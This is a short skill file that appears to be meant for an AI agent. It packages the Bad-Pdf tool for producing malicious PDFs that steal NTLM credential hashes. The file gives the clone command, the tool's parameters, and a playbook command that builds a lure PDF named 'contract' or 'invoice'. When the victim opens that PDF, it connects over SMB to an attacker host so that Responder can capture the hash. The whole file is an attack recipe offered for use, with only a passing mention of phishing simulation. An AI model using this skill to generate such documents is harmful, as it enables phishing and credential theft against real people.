---
name: bad-pdf-phish
description: "Bad-Pdf: steals NTLM hashes via PDF. Signals: phishing, social engineering, malicious PDF generation, GUI"
zh-signals: "Bad-Pdf: PDF NTLM 哈希窃取。信号:钓鱼,社会工程,恶意 PDF 生成,GUI。"
when-to-use: >-
  Use when running a phishing simulation and you need a malicious PDF that makes the victim
  connect back over SMB so Responder can capture NTLM hashes.
---

# Bad-Pdf

- Attack Category: C08 Phishing and Social Engineering
- Upstream Repository: https://github.com/deepzec/Bad-Pdf
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/deepzec/Bad-Pdf
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python badpdf.py -n invoice -p 445 -l 10.0.0.5` | Malicious PDF generation |
| `-n name -l lhost -p port` | Parameters |
| `-g` | GUI |

## Attack Scenario Playbook

### PDF NTLM Hash Theft

```bash
python badpdf.py -n contract -l 10.0.0.5 -p 445
# The victim opens the PDF and connects back over SMB, Responder captures the hash
```

## Notes

A PDF phishing payload generator.
